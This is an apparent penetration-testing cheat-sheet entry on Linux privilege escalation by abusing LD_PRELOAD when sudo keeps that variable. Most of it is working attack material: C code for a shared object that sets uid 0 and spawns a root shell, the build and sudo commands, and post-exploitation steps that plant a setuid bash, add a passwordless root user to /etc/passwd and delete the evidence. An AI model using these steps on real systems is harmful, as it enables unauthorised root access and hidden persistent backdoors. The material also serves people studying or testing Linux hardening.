### 1. Technique Name:

Shared Libraries â€“ LD_PRELOAD Privilege Escalation
### 2. Summary:

Linux programs frequently use dynamically linked shared object libraries (`.so` files). These libraries can be abused for privilege escalation, especially when the `LD_PRELOAD` environment variable is preserved in a `sudo` context. By hijacking or injecting shared functions before a privileged binary executes, an attacker can trick the program into running arbitrary code as root.
### 3. Conditions / Requirements:

- User has `sudo` permissions over a binary (e.g., `sudo -l`)    
- `LD_PRELOAD` is allowed in the sudo environment (`env_keep+=LD_PRELOAD`)
- Ability to compile a `.so` shared object
- Binary being run does not sanitize or ignore `LD_PRELOAD`
- Target binary must be dynamically linked (not statically compiled)
### 4. Enumeration Steps:
#### A. Check your sudo privileges:

```bash
sudo -l
```

Look for:

- Allowed command (e.g., `/usr/sbin/apache2 restart`)
- `env_keep+=LD_PRELOAD` present under `Matching Defaults`
#### B. Identify if binary is dynamically linked:

```bash
ldd /usr/sbin/apache2
```

If shared libraries are listed, it is dynamically linked.
### 5. Exploitation Steps:
#### A. Create a malicious shared object:

```c
// root.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
#### B. Compile the shared object:

```bash
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```
#### C. Run the vulnerable command with LD_PRELOAD:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
#### D. Confirm root access:

```bash
id
# uid=0(root) gid=0(root)
```
### 6. Post-Exploitation Tips:

- Add a persistent root shell:    

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

- Create a new root user:

```bash
echo 'haxor::0:0:root:/root:/bin/bash' >> /etc/passwd
```

- Clean up the malicious `.so` file:

```bash
rm /tmp/root.so
```
### 7. Example / Notes:

Sudo output:

```bash
(env_keep+=LD_PRELOAD)
(root) NOPASSWD: /usr/sbin/apache2 restart
```

Compiled shared object:

```bash
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

Exploit command:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Expected output:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

This confirms successful privilege escalation via LD_PRELOAD injection.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Shared_Libraries #LD_PRELOAD